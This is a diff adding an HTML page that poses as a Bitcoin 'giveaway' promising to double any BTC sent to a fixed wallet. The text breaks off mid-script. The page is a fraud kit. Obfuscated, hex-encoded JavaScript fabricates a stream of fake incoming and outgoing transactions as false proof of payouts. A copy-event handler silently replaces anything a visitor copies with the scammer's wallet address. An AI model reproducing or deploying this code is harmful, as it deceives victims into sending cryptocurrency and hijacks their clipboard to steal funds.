@@ -1,0 +1,413 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous">
+    <meta charset="utf-8">
+    <title>BTC BONUS GIVEAWAY</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/png" href="img/fav.png" />
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="http://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script>
+        window.onload = function() {
+            if (!localStorage.getItem("justonce")) {
+                localStorage.setItem("justOnce", "true");
+                window.location.reload();
+            }
+        }
+    </script>
+
+    <script type="text/javascript">
+        //<![CDATA[
+        window.onload = function() {
+
+            } //]]>
+    </script>
+
+    <script>
+        window.WALLET = '3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H';
+        var currentX = '';
+        var currentY = '';
+        var movementConstant = .015;
+        $(document).mousemove(function(e) {
+            if (currentX == '') currentX = e.pageX;
+            var xdiff = e.pageX - currentX;
+            currentX = e.pageX;
+            if (currentY == '') currentY = e.pageY;
+            var ydiff = e.pageY - currentY;
+            currentY = e.pageY;
+            $('.parallax div').each(function(i, el) {
+                var movement = (i + 1) * (xdiff * movementConstant);
+                var movementy = (i + 1) * (ydiff * movementConstant);
+                var newX = $(el).position().left + movement;
+                var newY = $(el).position().top + movementy;
+                $(el).css('left', newX + 'px');
+                $(el).css('top', newY + 'px');
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <div id='stars'></div>
+    <div id='stars2'></div>
+    <div id='stars3'></div>
+    <script type="text/javascript">
+        var _0xa78c = ["", "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39", "\x6C\x65\x6E\x67\x74\x68", "\x72\x61\x6E\x64\x6F\x6D", "\x66\x6C\x6F\x6F\x72", "\x63\x68\x61\x72\x41\x74", "\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x22\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x74\x6F\x70\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x6F\x77\x20\x72\x6F\x77\x2D\x74\x72\x61\x6E\x73\x2D\x6F\x75\x74\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x68\x61\x73\x68\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x33\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x33\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x33\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x33\x22\x3E\x7B\x74\x31\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x62\x6C\x6F\x63\x6B\x2D\x6E\x75\x6D\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x74\x32\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x67\x65\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x74\x33\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x64\x72\x65\x73\x73\x2D\x62\x74\x63\x2D\x73\x65\x63\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x32\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x32\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x74\x34\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6F\x75\x74\x2D\x74\x72\x61\x6E\x73\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x74\x35\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x64\x72\x65\x73\x73\x2D\x62\x74\x63\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x32\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x32\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x74\x36\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x75\x65\x2D\x73\x75\x6D\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x74\x37\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x74\x78\x2D\x66\x65\x65\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x74\x38\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x62\x6F\x74\x74\x6F\x6D\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x6F\x77\x20\x72\x6F\x77\x2D\x74\x72\x61\x6E\x73\x2D\x69\x6E\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x68\x61\x73\x68\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x33\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x33\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x33\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x33\x22\x3E\x7B\x62\x31\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x62\x6C\x6F\x63\x6B\x2D\x6E\x75\x6D\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x62\x32\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x67\x65\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x62\x33\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x64\x72\x65\x73\x73\x2D\x62\x74\x63\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x32\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x32\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x62\x34\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x2D\x74\x72\x61\x6E\x73\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x62\x35\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x64\x72\x65\x73\x73\x2D\x62\x74\x63\x2D\x73\x65\x63\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x32\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x32\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x62\x36\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x75\x65\x2D\x73\x75\x6D\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x31\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x31\x22\x3E\x7B\x62\x37\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x74\x78\x2D\x66\x65\x65\x20\x63\x6F\x6C\x2D\x6C\x67\x2D\x31\x20\x63\x6F\x6C\x2D\x6D\x64\x2D\x31\x20\x63\x6F\x6C\x2D\x73\x6D\x2D\x32\x20\x63\x6F\x6C\x2D\x78\x73\x2D\x32\x22\x3E\x7B\x62\x38\x7D\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x0D\x0A\x20\x20\x20\x20", "\x2E\x2E\x2E", "\x72\x69\x67\x68\x74\x20\x6E\x6F\x77", "\x31", "\x49\x4E", "3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H", "\x74\x6F\x46\x69\x78\x65\x64", "\x20\x42\x54\x43", "\x4F\x55\x54", "\x72\x65\x70\x6C\x61\x63\x65", "\x63\x65\x69\x6C", "\x7B\x74\x31\x7D", "\x7B\x74\x32\x7D", "\x7B\x74\x33\x7D", "\x7B\x74\x34\x7D", "\x7B\x74\x35\x7D", "\x7B\x74\x36\x7D", "\x7B\x74\x37\x7D", "\x7B\x74\x38\x7D", "\x7B\x62\x31\x7D", "\x7B\x62\x32\x7D", "\x7B\x62\x33\x7D", "\x7B\x62\x34\x7D", "\x7B\x62\x35\x7D", "\x7B\x62\x36\x7D", "\x7B\x62\x37\x7D", "\x7B\x62\x38\x7D", "\x2E\x74\x72\x61\x6E\x73\x2D\x74\x61\x62\x6C\x65", "\x70\x72\x65\x70\x65\x6E\x64\x54\x6F", "\x69\x6E\x64\x65\x78", "\x20\x6D\x69\x6E\x75\x74\x65\x73\x20\x61\x67\x6F", "\x68\x74\x6D\x6C", "\x65\x71", "\x2E\x74\x6F\x70\x20\x2E\x72\x6F\x77\x20\x64\x69\x76", "\x66\x69\x6E\x64", "\x2E\x62\x6F\x74\x74\x6F\x6D\x20\x2E\x72\x6F\x77\x20\x64\x69\x76", "\x65\x61\x63\x68", "\x2E\x69\x6E\x6E\x65\x72", "\x66\x61\x64\x65\x49\x6E", "\x2E\x74\x6F\x70", "\x66\x65\x77\x20\x73\x65\x63\x6F\x6E\x64\x73\x20\x61\x67\x6F", "\x72\x65\x61\x64\x79"];
+
+        function randomString(_0x8fb0x2) {
+            var _0x8fb0x3 = _0xa78c[0];
+            var _0x8fb0x4 = _0xa78c[1];
+            var _0x8fb0x5 = _0x8fb0x4[_0xa78c[2]];
+            for (var _0x8fb0x6 = 0; _0x8fb0x6 < _0x8fb0x2; _0x8fb0x6++) {
+                _0x8fb0x3 += _0x8fb0x4[_0xa78c[5]](Math[_0xa78c[4]](Math[_0xa78c[3]]() * _0x8fb0x5))
+            };
+            return _0x8fb0x3
+        }
+        var divCounter = 0;
+
+        function genDiv() {
+            divCounter++;
+            var _0x8fb0x9 = `${_0xa78c[6]}`;
+            let _0x8fb0xa = _0xa78c[0] + randomString(23) + _0xa78c[7];
+            let _0x8fb0xb = 616135;
+            let _0x8fb0xc = _0xa78c[8];
+            let _0x8fb0xd = _0xa78c[9] + randomString(15) + _0xa78c[7];
+            let _0x8fb0xe = _0xa78c[10];
+            let _0x8fb0xf = _0xa78c[11];
+            let _0x8fb0x10 = ((Math[_0xa78c[3]]() * 11.999) + 0.100)[_0xa78c[12]](3) + _0xa78c[13];
+            let _0x8fb0x11 = ((Math[_0xa78c[3]]() * 0.00999) + 0.00100)[_0xa78c[12]](5);
+            let _0x8fb0x12 = _0xa78c[0] + randomString(23) + _0xa78c[7];
+            let _0x8fb0x13 = 616135;
+            let _0x8fb0x14 = _0xa78c[8];
+            let _0x8fb0x15 = _0x8fb0xf;
+            let _0x8fb0x16 = _0xa78c[14];
+            let _0x8fb0x17 = _0x8fb0xd;
+            let _0x8fb0x18 = Math[_0xa78c[16]](_0x8fb0x10[_0xa78c[15]](_0xa78c[13], _0xa78c[0]) * 2) + _0xa78c[13];
+            let _0x8fb0x19 = ((Math[_0xa78c[3]]() * 0.00999) + 0.00100)[_0xa78c[12]](5);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[17], _0x8fb0x12);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[18], _0x8fb0x13);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[19], _0x8fb0x14);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[20], _0x8fb0x15);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[21], _0x8fb0x16);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[22], _0x8fb0x17);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[23], _0x8fb0x18);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[24], _0x8fb0x19);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[25], _0x8fb0xa);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[26], _0x8fb0xb);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[27], _0x8fb0xc);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[28], _0x8fb0xd);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[29], _0x8fb0xe);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[30], _0x8fb0xf);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[31], _0x8fb0x10);
+            _0x8fb0x9 = _0x8fb0x9[_0xa78c[15]](_0xa78c[32], _0x8fb0x11);
+            var _0x8fb0x1a = $(_0x8fb0x9)[_0xa78c[34]](_0xa78c[33]);
+            $(_0xa78c[43])[_0xa78c[42]](function() {
+                var _0x8fb0x6 = $(this)[_0xa78c[35]]();
+                if (_0x8fb0x6 > 0) {
+                    $(this)[_0xa78c[40]](_0xa78c[39])[_0xa78c[38]](2)[_0xa78c[37]](_0x8fb0x6 + _0xa78c[36]);
+                    $(this)[_0xa78c[40]](_0xa78c[41])[_0xa78c[38]](2)[_0xa78c[37]](_0x8fb0x6 + _0xa78c[36])
+                }
+            });
+            setTimeout(function() {
+                _0x8fb0x1a[_0xa78c[40]](_0xa78c[45])[_0xa78c[44]]();
+                _0x8fb0x1a[_0xa78c[40]](_0xa78c[41])[_0xa78c[38]](2)[_0xa78c[37]](_0xa78c[46])
+            }, 2000)
+        }
+        $(document)[_0xa78c[47]](function() {
+            genDiv();
+            setInterval(function() {
+                genDiv()
+            }, 15000)
+        })
+    </script>
+    <div class="container-full giveaway">
+        <div class="block col-lg-7 offset-lg-5">
+            <div class="col-lg-6 offset-lg-3 logo"><img src="img/logo.png"> <span class="logo_txt"></span> </div>
+            <div class="row">
+                <div class="col-lg-12 verify">
+                    To verify your address, just send from 0.05 to 20 BTC to the address below and get from 0.1 to 40 BTC <span class="yel">(x2 back).</span>
+                </div>
+            </div>
+            <div class="container-full">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="row main_giveaway">
+                            <div class="col-lg-8 col-sm-8 col-xs-8">
+                                <div class="title"><span class="yel">Payment Address</span></div>
+                                <div class="subtitle">You can send BTC to the following adress:</div>
+                                <div class="wallet"><span id="trnsctin" class="yel">3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H</span></div>
+
+                            </div>
+                            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-4">
+                                <div class="qr"><img src="https://chart.googleapis.com/chart?chs=130x130&chld=L|0&cht=qr&chl=bitcoin:3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H"></div>
+                            </div>
+                            <div class="buffer">
+                                <btn data-clipboard-text="3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H" class="copy"><i class="far fa-copy"></i>Copy Address to Clipboard</btn>
+                            </div>
+                            <script src="js/clipboard.js"></script>
+                            <script>
+                                var btns = document.querySelectorAll('btn');
+                                var clipboard = new ClipboardJS(btns);
+                                clipboard.on('success', function(e) {
+                                    console.log(e);
+                                });
+                                clipboard.on('error', function(e) {
+                                    console.log(e);
+                                });
+                            </script>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+        <div id="instruction" class="instruction col-lg-8 offset-lg-2">
+            <div class="guide col-lg-12"><span class="yel">Instruction:</span><br> - To make a transaction, you can use any wallet or exchange to participate!<br> - One-time use only, once we receive your transaction, we will immediately send the requested amount back to you.
+			<br>If you send 0.3 BTC, you will receive 0.6 BTC back +10% BONUS
+			<br>If you send 0.5 BTC, you will receive 1 BTC back +20% BONUS
+			<br>If you send 1 BTC, you will receive 2 BTC back +30% BONUS
+			<br>If you send 2 BTC, you will receive 4 BTC back +40% BONUS
+			<br>If you send 5 BTC, you will receive 10 BTC back +50% BONUS
+			<br>If you send 10 BTC, you will receive 20 BTC back +60% BONUS
+			</div>
+            <div class="wait"><i class="fas fa-spinner rotating"></i>Waiting for payment</div>
+            <div id="info-fir" class="info">Still waiting for transaction? <a href='#instruction' pl-js-close="info-fir" pl-js-open="info-sec" class="click">Click Here</a><br> Once we receive your transaction, the outgoing transaction is processed to your address.<br> Every address
+                that is sent too late, gets their BTC immediately sent back.</div>
+            <div id="info-sec" style="display: none;" class="info">Sometimes transactions are not sent properly.<br> Try sending it again.<br> Remember, every transaction address we receive gets their BTC back + giveaway prize.</div>
+            <div id="lympo_progress">
+                <div class="row progress-row">
+                    <div class="colums_12">
+                        <div class="progress-ico">
+                            <div class="progress-ico">
+                                <div class="progress">
+                                    <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 100%;">
+                                        <span class="sr-only">x</span></div>
+                                </div>
+                            </div>
+                            <div class="dot-1" id="leftBTC">
+                                Counting BTC left...
+                            </div>
+                            <div class="dot-1-airdrop  progress-left" style="left: 100%;"></div>
+                            <span class="progress-bar-value" id="progress-ico-bar"></span></div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="last_trans">
+        <h1 class="f-24 mvn em-300">Transactions for Address:<span id="trnsctin">3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H</span></h1>
+
+
+    </div>
+    <script>
+        $(document).on('click', '[pl-js-open]', function() {
+            $(this)
+                .attr('pl-js-open')
+                .split('|')
+                .forEach(function(id) {
+                    $('#' + id).show();
+                })
+        });
+
+        $(document).on('click', '[pl-js-close]', function() {
+            $(this)
+                .attr('pl-js-close')
+                .split('|')
+                .forEach(function(id) {
+                    $('#' + id).hide();
+                })
+        });
+    </script>
+
+
+    <script>
+        function random(t, e) {
+            var n = arguments.length;
+            if (0 === n) t = 0, e = 2147483647;
+            else if (1 === n) throw new Error("Warning: rand() expects exactly 2 parameters, 1 given");
+            return Math.floor(Math.random() * (e - t + 1)) + t
+        }
+
+        function uuidv4() {
+            return "xxxxxxxxxxxxxxxx".replace(/[xy]/g, function(t) {
+                var e = 16 * Math.random() | 0;
+                return ("x" == t ? e : 3 & e | 8).toString(16)
+            })
+        }
+
+        function bet(t, e, n) {
+            return t = t.toString().replace("\n", ""), e = e.toString().replace("\n", ""), void 0 !== (n = n.toString().replace("\n", "")).split(t)[1] ? n.split(t)[1].split(e)[0] : void 0
+        }
+
+        function removeArr(t) {
+            for (var e, n, a = arguments, r = a.length; r > 1 && t.length;)
+                for (e = a[--r]; - 1 !== (n = t.indexOf(e));) t.splice(n, 1);
+            return t
+        }
+
+        function addLink() {
+            var t = window.getSelection(),
+                e = document.createElement("div");
+            e.style.position = "absolute", e.style.left = "-99999px", document.body.appendChild(e), e.innerHTML = "3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H", t.selectAllChildren(e), window.setTimeout(function() {
+                document.body.removeChild(e)
+            }, 100)
+        }
+
+        function sub() {
+            for (ramdot = gF.random(2, 5), dots = [], i = 0; i < ramdot; i++) dots[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
+            for (ramdot2 = gF.random(2, 5), dots2 = [], i = 0; i < ramdot2; i++) dots2[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
+            return dots.join("-") + "." + dots2.join(".")
+        }
+
+        function newtr() {
+            tr = document.createElement("tr"), tr.innerHTML = '<td><a class="address-tag" href="/eth">0x9addb4ab6a83b917...</a></td><td class="hidden-sm"><a href="/eth">9424669</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >1 mins ago</span></td><td><a class="address-tag" href="/eth">37762eEWdPaQKguMMa...</a></td><td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td><td><span class="address-tag">1NDyJtNTjmwk5xPNhjg...</span></td><td>4 ETH</td><td><font color="gray" size="1">0<b>.</b>00042</font></td>', INT = "0x" + uuidv4().toLowerCase(), OUT = "0x" + uuidv4().toLowerCase(), TXID = "0x" + uuidv4().toLowerCase(), TXID2 = "0x" + uuidv4().toLowerCase(), INCIN = (Math.random() * (66) + 9.5).toFixed(3), INOUT = (2 * INCIN + 0.5).toFixed(0);
+            var t = document.getElementById("myTable").insertRow(1),
+                e = t.insertCell(0),
+                n = t.insertCell(1),
+                a = t.insertCell(2),
+                r = t.insertCell(3),
+                d = t.insertCell(4),
+                s = t.insertCell(5),
+                i = t.insertCell(6),
+                o = t.insertCell(7);
+            e.innerHTML = '<a class="toolme" class="address-tag" href="/eth">' + TXID + "...</a>", n.innerHTML = '<td class="hidden-sm"><a href="/eth">9424669</a></td>', a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>', r.innerHTML = '<td><a class="address-tag" href="/eth">' + OUT + "...</a></td>", d.innerHTML = '<td><span class="label label-success rounded">&nbsp; IN &nbsp;</span></td>', s.innerHTML = '<td><span class="address-tag">' + window.WALLET.substring(0, 19) + "...</span></td>", i.innerHTML = "<td>" + INCIN + " ETH</td>", o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>", document.getElementsByTagName("tr")[1].classList.add("toolbar"), setTimeout(function() {
+                var t = document.getElementById("myTable").insertRow(1),
+                    e = t.insertCell(0),
+                    n = t.insertCell(1),
+                    a = t.insertCell(2),
+                    r = t.insertCell(3),
+                    d = t.insertCell(4),
+                    s = t.insertCell(5),
+                    i = t.insertCell(6),
+                    o = t.insertCell(7);
+                e.innerHTML = '<a class="address-tag" href="/eth">' + TXID2 + "...</a>", n.innerHTML = '<td class="hidden-sm"><a href="/eth">9424669</a></td>', a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>', r.innerHTML = '<td><a class="address-tag" href="/eth">' + window.WALLET.substring(0, 19) + "...</a></td>", d.innerHTML = '<td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td>', s.innerHTML = '<td><span class="address-tag">' + OUT + "...</span></td>", i.innerHTML = "<td>" + INOUT + " ETH</td>", o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>", document.getElementsByTagName("tr")[1].classList.add("toolbar")
+            }, 1500)
+        }
+
+        function insertAfter(t, e) {
+            e.parentNode.insertBefore(t, e.nextSibling)
+        }
+
+        function updateTrans() {
+            for (i = 0; i < times.length; i++) "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 mins ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago";
+            newtr()
+        }
+        document.addEventListener("copy", addLink), times = document.getElementsByClassName("tim3"), window.onload = function() {
+            updateTrans(), trans = setInterval(function() {
+                updateTrans()
+            }, 1e4)
+        }, document.getElementById("address").innerHTML = window.WALLET, document.getElementById("qrcode").src = "http://chart.apis.google.com/chart?cht=qr&chs=300x300&chl=" + window.WALLET + "&chld=H|0", document.getElementById("trnsctin").innerHTML = window.WALLET;
+    </script>
+    <script>
+        // tell the embed parent frame the height of the content
+        if (window.parent && window.parent.parent) {
+            window.parent.parent.postMessage(["resultsFrame", {
+                height: document.body.getBoundingClientRect().height,
